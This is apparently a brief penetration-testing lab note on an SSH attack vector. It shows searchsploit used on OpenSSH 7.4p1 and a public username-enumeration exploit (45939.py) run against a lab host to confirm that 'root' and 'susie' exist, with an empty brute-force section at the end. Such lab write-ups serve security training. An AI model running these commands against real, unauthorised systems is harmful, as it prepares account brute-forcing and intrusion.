Attack Vector 1 - SSH

# Searchsploit
`searchsploit OpenSSH 7.4p1`
![9f85dad747df329368997e3b3b0af254.png](../../../_resources/86c2f57b857647bd9004a9c09966fc99.png)

## 45939 Exploit
This exploit verifies usernames. We can verify that root and susie are valid login names.

`python 45939.py 10.11.1.146 susie`
![dbbdb355a362c19c7abcf8ac888531f5.png](../../../_resources/de599586f1414bc29fcab8cb25f222d2.png)

`python 45939.py 10.11.1.146 root`
![7d72f91a432d94b0f345fcdd9414b329.png](../../../_resources/6666bb37089a49deb36213408a189120.png)


# Brute force


